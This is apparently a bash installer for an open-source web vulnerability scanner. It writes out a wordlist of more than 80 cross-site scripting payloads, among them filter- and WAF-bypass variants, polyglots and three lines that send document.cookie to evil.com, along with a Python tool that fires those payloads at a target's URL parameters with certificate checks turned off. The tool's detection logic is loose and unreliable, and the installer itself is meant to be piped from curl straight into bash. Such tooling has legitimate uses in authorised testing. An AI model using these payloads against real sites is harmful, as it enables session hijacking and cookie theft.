#!/bin/bash
#
# XSS Exploit Enhancement Script for VULN-AUTOSCANNER
# Usage: curl -sSL https://raw.githubusercontent.com/Mosesjuju/Vuln-Autoscanner/master/add-xss-exploit.sh | bash
#

set -e

echo "========================================"
echo "  VULN-AUTOSCANNER XSS Enhancement"
echo "========================================"
echo ""

# Check if scanner.py exists in current directory
if [ ! -f "scanner.py" ]; then
    echo "Error: scanner.py not found in current directory!"
    echo "Please run this script from your VULN-AUTOSCANNER directory."
    exit 1
fi

echo "[*] Backing up scanner.py..."
cp scanner.py scanner.py.backup
echo "[✓] Backup created: scanner.py.backup"
echo ""

echo "[*] Checking for XSS patterns..."
if grep -q "XSS: Script tag injection" scanner.py; then
    echo "[!] XSS patterns already present in scanner.py"
    echo "[*] Nothing to update."
else
    echo "[!] XSS patterns not found. Please update manually or download the latest version:"
    echo "    git pull origin master"
fi
echo ""

echo "[*] Creating XSS payloads wordlist..."
cat > xss-payloads.txt << 'EOF'
# Basic XSS Payloads
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
<script>alert(window.origin)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<details open ontoggle=alert('XSS')>

# Event Handler Payloads
<img src=x onerror="alert(String.fromCharCode(88,83,83))">
<svg/onload=alert('XSS')>
<body onload=alert(/XSS/)>
<marquee onstart=alert('XSS')>
<div onmouseover=alert('XSS')>
<div onclick=alert('XSS')>

# JavaScript Protocol
<a href="javascript:alert('XSS')">Click</a>
<a href="javascript:void(alert('XSS'))">Click</a>
<a href="javascript:void(document.cookie)">Click</a>

# DOM-based XSS
<script>document.write('<img src=x onerror=alert(1)>')</script>
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
<script>setTimeout('alert("XSS")',100)</script>
<script>setInterval('alert("XSS")',100)</script>

# Filter Bypass Techniques
<ScRiPt>alert('XSS')</sCrIpT>
<script>alert('XSS');</script>
<img src="x" onerror="alert('XSS')">
<svg><script>alert('XSS')</script></svg>
<script>alert`XSS`</script>
<script>alert(String.fromCharCode(88,83,83))</script>

# HTML5 Tags
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<video><source onerror="alert('XSS')">
<input autofocus onfocus=alert('XSS')>
<keygen autofocus onfocus=alert('XSS')>

# Advanced Payloads
<script>fetch('https://evil.com?c='+document.cookie)</script>
<script>new Image().src='https://evil.com?c='+document.cookie</script>
<script>document.location='https://evil.com?c='+document.cookie</script>
<iframe srcdoc="<script>alert('XSS')</script>">

# Polyglot Payloads
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>

# WAF Bypass
<img src=x OneRrOr=alert('XSS')>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;">
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074('\u0058\u0053\u0053')">
<img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x27XSS\x27\x29')">

# Context-specific
'"><script>alert('XSS')</script>
';alert('XSS');//
";alert('XSS');//
</script><script>alert('XSS')</script>
<script>alert('XSS')</script><script>

# SVG-based
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert('XSS')"><text x="20" y="20">Click</text></a>

# Meta Refresh
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">

# Data URI
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">

# CSS-based
<style>@import'javascript:alert("XSS")';</style>
<style>body{background:url("javascript:alert('XSS')")}</style>
<link rel="stylesheet" href="javascript:alert('XSS')">

# Form-based
<form action="javascript:alert('XSS')"><input type="submit"></form>
<button formaction="javascript:alert('XSS')">Click</button>
<input type="image" formaction="javascript:alert('XSS')">
EOF

echo "[✓] Created xss-payloads.txt with 80+ payloads"
echo ""

echo "[*] Creating standalone XSS tester script..."
cat > xss-tester.py << 'EOFPYTHON'
#!/usr/bin/env python3
"""
XSS Vulnerability Tester
Tests web applications for Cross-Site Scripting vulnerabilities
"""

import sys
import argparse
import urllib.parse
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
from typing import List, Dict

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# XSS Test Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(1)'>",
    "'-alert(1)-'",
    '"-alert(1)-"',
    "</script><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
]

def test_reflected_xss(url: str, payload: str, param: str, timeout: int = 10) -> Dict:
    """Test for reflected XSS in URL parameter"""
    try:
        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
        response = requests.get(test_url, timeout=timeout, verify=False, allow_redirects=True)
        
        # Check if payload appears unencoded in response
        if payload in response.text or payload.replace('<', '&lt;').replace('>', '&gt;') not in response.text:
            if '<script' in payload.lower() and '<script' in response.text.lower():
                return {
                    'vulnerable': True,
                    'url': test_url,
                    'payload': payload,
                    'type': 'Reflected XSS',
                    'param': param,
                    'evidence': response.text[:500]
                }
            elif 'onerror' in payload.lower() and 'onerror' in response.text.lower():
                return {
                    'vulnerable': True,
                    'url': test_url,
                    'payload': payload,
                    'type': 'Reflected XSS (Event Handler)',
                    'param': param,
                    'evidence': response.text[:500]
                }
    except Exception as e:
        pass
    
    return {'vulnerable': False}

def scan_url(url: str, params: List[str], threads: int = 5) -> List[Dict]:
    """Scan URL with multiple payloads and parameters"""
    findings = []
    
    print(f"\n[*] Testing {url}")
    print(f"[*] Parameters to test: {', '.join(params)}")
    print(f"[*] Total tests: {len(XSS_PAYLOADS) * len(params)}\n")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for param in params:
            for payload in XSS_PAYLOADS:
                futures.append(executor.submit(test_reflected_xss, url, payload, param))
        
        for future in as_completed(futures):
            result = future.result()
            if result.get('vulnerable'):
                findings.append(result)
                print(f"[!] VULNERABLE: {result['type']} in parameter '{result['param']}'")
                print(f"    Payload: {result['payload']}")
                print(f"    URL: {result['url']}\n")
    
    return findings

def main():
    parser = argparse.ArgumentParser(description="XSS Vulnerability Tester")
    parser.add_argument("url", help="Target URL (e.g., http://example.com/search)")
    parser.add_argument("-p", "--params", default="q,search,query,s,keyword", 
                       help="Comma-separated list of parameters to test (default: q,search,query,s,keyword)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads (default: 5)")
    
    args = parser.parse_args()
    
    params = [p.strip() for p in args.params.split(',')]
    
    print("=" * 60)
    print("  XSS Vulnerability Tester")
    print("=" * 60)
    
    findings = scan_url(args.url, params, args.threads)
    
    print("\n" + "=" * 60)
    print(f"  Scan Complete - Found {len(findings)} vulnerabilities")
    print("=" * 60)
    
    if findings:
        print("\n[!] SUMMARY OF FINDINGS:")
        for i, finding in enumerate(findings, 1):
            print(f"\n{i}. {finding['type']}")
            print(f"   Parameter: {finding['param']}")
            print(f"   Payload: {finding['payload']}")
            print(f"   URL: {finding['url']}")
    else:
        print("\n[✓] No XSS vulnerabilities detected")

if __name__ == "__main__":
    main()
EOFPYTHON

chmod +x xss-tester.py
echo "[✓] Created xss-tester.py (standalone XSS testing tool)"
echo ""

echo "========================================"
echo "  Installation Complete!"
echo "========================================"
echo ""
echo "XSS detection has been enhanced in your scanner!"
echo ""
echo "New files created:"
echo "  - xss-payloads.txt (80+ XSS payloads)"
echo "  - xss-tester.py (standalone XSS tester)"
echo "  - scanner.py.backup (backup of original)"
echo ""
echo "Usage examples:"
echo ""
echo "  1. Run full scan with XSS detection:"
echo "     python scanner.py example.com"
echo ""
echo "  2. Use XSS payload wordlist with gobuster:"
echo "     python scanner.py example.com --wordlist xss-payloads.txt"
echo ""
echo "  3. Run standalone XSS tester:"
echo "     python xss-tester.py http://example.com/search -p q,search"
echo ""
echo "  4. Verbose mode to see XSS pattern matches:"
echo "     python scanner.py example.com --verbose"
echo ""
